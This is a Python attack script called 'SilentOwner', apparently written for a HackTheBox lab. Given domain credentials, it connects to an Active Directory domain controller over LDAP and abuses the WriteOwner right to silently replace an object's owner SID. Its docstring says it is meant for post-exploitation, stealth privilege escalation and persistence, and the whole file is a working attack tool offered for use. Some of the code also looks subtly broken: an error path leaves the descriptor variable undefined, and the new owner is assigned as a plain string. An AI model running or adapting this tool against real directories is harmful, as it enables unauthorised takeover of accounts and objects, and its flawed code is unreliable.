#!/usr/bin/env python3

"""
🛡️ SilentOwner — Replace LDAP OwnerSID via WriteOwner without touching ACEs
🧬 Built for post-exploitation, stealth privilege escalation, and AD persistence.
"""

import argparse
from ldap3 import Server, Connection, NTLM, MODIFY_REPLACE
from ldap3.protocol.microsoft import security_descriptor_control
from impacket.ldap.ldaptypes import SR_SECURITY_DESCRIPTOR

def replace_owner(dc_ip, username, password, domain, target_dn, new_owner_sid):
    print("\n🛡️ SilentOwner is live — scanning for target object ownership...\n")

    # Setup LDAP server and connection
    server = Server(dc_ip, get_info=None)
    conn = Connection(
        server,
        user=f"{domain}\\{username.split('@')[0]}",
        password=password,
        authentication=NTLM,
        auto_bind=True
    )
    print("[+] LDAP bind successful.")

    # Request nTSecurityDescriptor with SDFlags = 0x01 (OWNER_SECURITY_INFORMATION)
    controls = security_descriptor_control(sdflags=0x01)

    if not conn.search(
        search_base=target_dn,
        search_filter="(objectClass=*)",
        attributes=["nTSecurityDescriptor"],
        controls=controls
    ):
        print(f"[❌] Failed to find object: {target_dn}")
        return

    entry = conn.entries[0]
    raw_sd = entry["nTSecurityDescriptor"].raw_values[0]
    print(f"[DEBUG] Raw sd['OwnerSid']: {raw_sd!r}")

    try:
        sd = SR_SECURITY_DESCRIPTOR(data=raw_sd)
        current_owner = sd["OwnerSid"].formatCanonical()
        print(f"[+] Current owner: {current_owner}")
    except Exception:
        print("[!] Owner SID is empty or not set. Proceeding to set a new owner.")

    print(f"[+] Replacing owner with: {new_owner_sid}")

    # Prepare new SD with updated owner
    sd.OwnerSid = new_owner_sid
    sd_data = sd.getData()

    # Modify the nTSecurityDescriptor attribute
    success = conn.modify(
        dn=target_dn,
        changes={"nTSecurityDescriptor": [(MODIFY_REPLACE, [sd_data])]},
        controls=controls
    )

    if success:
        print(f"[✅] Ownership of {target_dn} successfully changed to {new_owner_sid}")
    else:
        print(f"[❌] Modify failed: {conn.result}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="🛡️ SilentOwner - Replace LDAP OwnerSID via WriteOwner privilege"
    )

    parser.add_argument("--dc-ip", required=True, help="IP address of the Domain Controller")
    parser.add_argument("-u", "--username", required=True, help="Username (e.g. user@domain.local)")
    parser.add_argument("-p", "--password", required=True, help="Password")
    parser.add_argument("--domain", required=True, help="Domain name (e.g. certified.htb)")
    parser.add_argument("--target-dn", required=True, help="Distinguished Name of the target object")
    parser.add_argument("--new-owner-sid", required=True, help="SID to assign as the new owner")

    args = parser.parse_args()

    replace_owner(
        args.dc_ip,
        args.username,
        args.password,
        args.domain,
        args.target_dn,
        args.new_owner_sid
    )
